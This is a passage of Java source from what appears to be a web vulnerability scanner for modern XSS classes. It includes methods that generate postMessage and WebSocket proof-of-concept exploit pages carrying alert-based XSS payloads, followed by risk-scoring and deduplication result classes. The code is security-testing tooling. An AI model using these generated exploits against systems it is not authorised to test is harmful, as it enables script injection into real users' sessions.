        poc.append("<!-- PostMessage XSS PoC -->\n");
        poc.append("<iframe id=\"target\" src=\"").append(targetUrl).append("\"></iframe>\n");
        poc.append("<script>\n");
        poc.append("  document.getElementById('target').onload = function() {\n");

        // Build message object using actual keys found in handler
        if (dataKeys.isEmpty()) {
            // Fallback: send raw string payload
            String xssPayload = sinks.contains("eval") || sinks.contains("Function")
                ? "alert(document.domain)"
                : "<img src=x onerror=alert(document.domain)>";
            poc.append("    this.contentWindow.postMessage(\n");
            poc.append("      '").append(xssPayload).append("',\n");
            poc.append("      '*'\n    );\n");
        } else {
            poc.append("    this.contentWindow.postMessage({\n");
            String xssPayload = sinks.contains("eval") || sinks.contains("Function")
                ? "alert(document.domain)"
                : "<img src=x onerror=alert(document.domain)>";
            for (int i = 0; i < dataKeys.size(); i++) {
                poc.append("      ").append(dataKeys.get(i)).append(": '").append(xssPayload).append("'");
                if (i < dataKeys.size() - 1) poc.append(",");
                poc.append("\n");
            }
            poc.append("    }, '*');\n");
        }

        poc.append("  };\n");
        poc.append("</script>");
        return poc.toString();
    }

    /**
     * Generate dynamic WebSocket exploit PoC
     */
    private String generateDynamicWebSocketExploit(String targetUrl, String wsUrl,
                                                     List<String> dataKeys, List<String> sinks) {
        StringBuilder poc = new StringBuilder();
        poc.append("<!-- WebSocket XSS PoC -->\n");
        poc.append("<!-- Target: ").append(targetUrl).append(" -->\n");
        poc.append("<script>\n");
        poc.append("  var ws = new WebSocket('").append(wsUrl != null ? wsUrl : "ws://target/ws").append("');\n");
        poc.append("  ws.onopen = function() {\n");

        String xssPayload = sinks.contains("eval") || sinks.contains("Function")
            ? "alert(document.domain)"
            : "<img src=x onerror=alert(document.domain)>";

        if (dataKeys.isEmpty()) {
            poc.append("    ws.send('").append(xssPayload).append("');\n");
        } else {
            poc.append("    ws.send(JSON.stringify({\n");
            for (int i = 0; i < dataKeys.size(); i++) {
                poc.append("      ").append(dataKeys.get(i)).append(": '").append(xssPayload).append("'");
                if (i < dataKeys.size() - 1) poc.append(",");
                poc.append("\n");
            }
            poc.append("    }));\n");
        }

        poc.append("  };\n");
        poc.append("</script>");
        return poc.toString();
    }

    // ==================== RESULT CLASSES ====================

    /**
     * Container for all modern XSS analysis results
     */
    public static class ModernXSSResult {
        public List<VulnerabilityInfo> domClobberingVulns = new ArrayList<>();
        public List<VulnerabilityInfo> mxssVulns = new ArrayList<>();
        public List<VulnerabilityInfo> protoPollutionVulns = new ArrayList<>();
        public List<VulnerabilityInfo> postMessageVulns = new ArrayList<>();
        public List<VulnerabilityInfo> serviceWorkerVulns = new ArrayList<>();
        public List<VulnerabilityInfo> importMapVulns = new ArrayList<>();
        public List<VulnerabilityInfo> trustedTypesVulns = new ArrayList<>();
        public List<VulnerabilityInfo> graphqlVulns = new ArrayList<>();
        public List<VulnerabilityInfo> websocketVulns = new ArrayList<>();

        public double overallRiskScore = 0.0;
        public String overallRiskLevel = "Low";

        public void calculateOverallRisk() {
            int totalVulns = 0;
            double totalScore = 0.0;

            List<List<VulnerabilityInfo>> allVulns = Arrays.asList(
                domClobberingVulns, mxssVulns, protoPollutionVulns,
                postMessageVulns, serviceWorkerVulns, importMapVulns,
                trustedTypesVulns, graphqlVulns, websocketVulns
            );

            for (List<VulnerabilityInfo> vulnList : allVulns) {
                for (VulnerabilityInfo vuln : vulnList) {
                    totalVulns++;
                    double severityScore = 0;
                    switch (vuln.severity.toLowerCase()) {
                        case "critical": severityScore = 100; break;
                        case "high": severityScore = 75; break;
                        case "medium": severityScore = 50; break;
                        case "low": severityScore = 25; break;
                    }
                    totalScore += (severityScore * vuln.confidence / 100.0);
                }
            }

            if (totalVulns > 0) {
                overallRiskScore = totalScore / totalVulns;
                if (overallRiskScore >= 75) overallRiskLevel = "Critical";
                else if (overallRiskScore >= 50) overallRiskLevel = "High";
                else if (overallRiskScore >= 25) overallRiskLevel = "Medium";
                else overallRiskLevel = "Low";
            }
        }

        public List<VulnerabilityInfo> getAllVulnerabilities() {
            List<VulnerabilityInfo> raw = new ArrayList<>();
            raw.addAll(domClobberingVulns);
            raw.addAll(mxssVulns);
            raw.addAll(protoPollutionVulns);
            raw.addAll(postMessageVulns);
            raw.addAll(serviceWorkerVulns);
            raw.addAll(importMapVulns);
            raw.addAll(trustedTypesVulns);
            raw.addAll(graphqlVulns);
            raw.addAll(websocketVulns);

            // Deduplicate: keep highest confidence for each unique key
            Map<String, VulnerabilityInfo> dedupMap = new LinkedHashMap<>();
            for (VulnerabilityInfo vuln : raw) {
                String key = vuln.dedupKey();
                VulnerabilityInfo existing = dedupMap.get(key);
                if (existing == null) {
                    dedupMap.put(key, vuln);
                } else {
                    // Keep the one with higher confidence, or higher severity if confidence is equal
                    if (vuln.confidence > existing.confidence ||
                        (vuln.confidence == existing.confidence &&
                         severityRank(vuln.severity) > severityRank(existing.severity))) {
                        dedupMap.put(key, vuln);
                    }
                }
            }
            return new ArrayList<>(dedupMap.values());
        }

        private int severityRank(String severity) {
            if (severity == null) return 0;
            switch (severity.toLowerCase()) {
                case "critical": return 4;
                case "high": return 3;
                case "medium": return 2;
                case "low": return 1;
                default: return 0;
            }
        }

        public int getTotalCount() {
            return getAllVulnerabilities().size();
        }
    }

    /**
     * Individual vulnerability information
     */
    public static class VulnerabilityInfo {
        public String type;
        public String severity;
        public double confidence;
        public String description;
        public String parameter;
        public String payload;
        public String remediation;
        public String evidence;       // Actual JS code snippet from response
        public String sinkType;       // Specific sink found (innerHTML, eval, document.write, etc.)
        public String targetUrl;      // Actual URL of the target
        public String handlerCode;    // Extracted handler function body (for postMessage/WebSocket)
        public String messageKeys;    // Detected data keys in handler (e.g., "html", "content", "data")
        public String paramType;      // Parameter location: URL, Body, Cookie, JSON, etc.
        public String httpMethod;     // GET, POST, PUT, etc.

        /**
         * Generate a deduplication key for this vulnerability.
         * Two vulns with the same key are considered duplicates.
         */
        public String dedupKey() {
            StringBuilder key = new StringBuilder();
            key.append(type != null ? type : "");
            key.append("|");
            key.append(parameter != null ? parameter : "");
            key.append("|");
            key.append(sinkType != null ? sinkType : "");
            key.append("|");
            // Include targetUrl path (not query) to allow same-path dedup
            if (targetUrl != null) {
                try {
                    java.net.URL u = new java.net.URL(targetUrl);
                    key.append(u.getProtocol()).append("://").append(u.getHost());
                    if (u.getPort() != -1 && u.getPort() != u.getDefaultPort()) {
                        key.append(":").append(u.getPort());
                    }
                    key.append(u.getPath());
                } catch (Exception e) {
                    key.append(targetUrl);
                }
            }
            return key.toString();
        }

        @Override
        public String toString() {
            String sink = sinkType != null ? " via " + sinkType : "";
            return String.format("[%s] %s%s (Confidence: %.0f%%) - %s",
                severity, type, sink, confidence, parameter);
        }
    }
}
